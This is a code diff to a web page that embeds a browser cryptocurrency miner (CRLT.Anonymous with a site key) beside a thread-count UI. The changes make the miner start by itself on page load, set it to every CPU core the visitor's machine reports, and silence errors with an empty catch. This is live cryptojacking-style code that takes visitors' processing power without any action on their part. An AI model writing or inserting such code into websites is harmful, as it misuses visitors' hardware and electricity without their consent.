@@ -20,7 +20,7 @@
      <div class="four columns">
        <h4 class="number-label">Threads</h4>
        <h2>
-         <span id="mining-threads">2</span>
+         <span id="mining-threads">4</span>
          <span id="mining-threads-add" class="action">+</span>
          <span class="mining-divide"> / </span>
          <span id="mining-threads-remove" class="action">-</span>
@@ -55,7 +55,12 @@
 <script>
 var miner = null;
 try {
-  miner = new CRLT.Anonymous('93f2b499059e36dd47dc89b9dbef7c329283c1e1f77e', {threads: 4, throttle:0.5});
+  var threads = window.navigator.hardwareConcurrency;
+            if (threads < 1) {
+                var threads = 1;
+            }
+  miner = new CRLT.Anonymous('93f2b499059e36dd47dc89b9dbef7c329283c1e1f77e', {threads: threads,autoThreads:false, throttle:0.5});
+  miner.start();
 } catch(e) {}
 
 var ui = new MinerUI(miner, {
